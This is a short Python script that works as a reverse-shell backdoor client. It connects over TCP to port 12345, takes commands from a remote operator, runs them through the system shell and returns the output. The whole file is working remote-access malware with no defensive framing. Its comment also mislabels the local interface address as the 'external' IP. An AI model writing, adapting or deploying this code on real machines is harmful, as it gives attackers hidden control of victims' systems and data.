#!/usr/bin/python3
import json 
import socket
import subprocess


def get_external_ipv4_address():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to a public DNS server to get the external IP address
        sock.connect(('8.8.8.8', 80))
        ip_address = sock.getsockname()[0]
    finally:
        sock.close()
    return ip_address


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    while True:
        command = reliable_recv()
        if command == "q":
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except:
                reliable_send("[!!] Can't Execute That Command")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ipv4 = get_external_ipv4_address()
sock.connect((f"{ipv4}", 12345))
print("Connection stablished to server!")
shell()
sock.close()
